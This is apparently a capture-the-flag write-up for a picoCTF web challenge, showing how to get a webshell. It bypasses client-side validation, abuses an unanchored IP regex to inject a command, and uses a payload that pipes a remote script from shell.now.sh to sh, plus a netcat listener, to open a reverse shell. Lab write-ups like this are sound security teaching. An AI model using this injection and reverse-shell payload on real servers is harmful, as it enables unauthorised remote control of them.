## fancy-alive-monitoring - Points: 400
>One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell.picoctf.com:8587?

Note.
>The CTF server somehow blocked the outbound connection to non-standard ports. So on our own server, we need to listen on port 80, `sudo nc -lvp 80`.

### Intro
The main purpose of this blog post is to demonstrate how to get a webshell from a web server.

### What is a Webshell, why is it useful?
A few facts about Webshell,

- Webshell, as its name indicates, is to obtain a shell by means of a website.

  This diffs from how shell is usually accessed, which is either remotely via SSH, or log in directly in a server's console.

- A shell can be either a Linux shell, like Bash/Zsh, etc., or a command prompt from Windows.

Of course, above is my understanding of what a Webshell is, and what I believe the term "Webshell' should represent, not authoritative, but should be close.

A Webshell can be utilized to serve different purposes. It can be used to gain complete control of a web server; to search for sensetive information on the server; or to be used as a outpost to gather further information that can help to infiltrate other parts of the infrastructure that share the same network as the web server, etc. etc.

### Getting a Webshell
Ok, let us back to our main business. We will be using the CTF challenge in question to demonstrate how to get a Webshell.

First of all, the server code is published on the challenge's website.

A few points to note,

- The `check()` function in the embedded javascript is doing a validation check against the IP address user inputted.

  Some interesting methods I read from other writeups to circumvent it,

  - we can send a HTTP POST request directly to the web server, thus bypassing the javascript validation.
  - or we can simiply replace the `check()` function in the `Console` inside the developer tool of a browser, with the following,

  ```javascript
  function check(){
    document.getElementById("monitor").submit();
  }
  ```

  That is, when the `Go!` button is clicked, the `check()` function will be calling `.submit()` right away to submit the form, without doing any validation against the input.

- After the data is posted to the server, there is a second check being performed.
  ```php
  preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)
  ```
  This check looks more promising, it does a decent job validating the IP address, which doesn't seem to expose any holes for exploitation.
  However, if we look more colsely, the regex doesn't end with a anchor `$`. That means as long as the data begins with a valid IP address, the data will be considered valid. This is where makes it vulnerable.
  
Since the symbol `;` can be used in PHP to chain the commands, if the payload of the POST request is `1.1.1.1 ; command`, then we can actually trick PHP to execute the command on the web sever!

Here, we will utilize the `command` part to get a reverse shell from the web server, the complete payload looks like, 
```php
1.1.1.1 ; curl https://shell.now.sh/52.18.79.59:5580 | sh
```

`https://shell.now.sh` is a HTTP endpoint that accept an `IP:PORT` as a path parameter, that the web server will be connecting to.

In this demo, the machine to which the IP is attached is controlled by me, and the goal here is to instruct the web server to proactively connect to the `IP:PORT`, and present a shell on my machine, as if I am just SSH'ed into it.

To achieve that, we just do,

1. On my own machine, run `nc -lvp 80` to instruct it to listen on port 80.
1. Fire up `Console` in the developer tool, change the `check()` function to what just shown above.
1. Type in `1.1.1.1 ; curl https://shell.now.sh/xxx.xxx.xxx.xxx:80 | sh` in the text box of the challenge website.
1. Back to `Console`, key in `check();` and press Enter.
1. Go back to my machine, we will see some oupputs under the `nc` command,
  ```bash
  Connection from xxx.xxx.xxx.xxx 36148 received!
  /bin/dash: 0: can't access tty; job control turned off
  $ 
  ```
  now type `whoami` in this window, we will see `www-data`. That's the default user under which the Apache service is running under Ubuntu. We get a shell from the web server!

The door is opened, the rest is left to your imagination.

Hope you enjoyed!


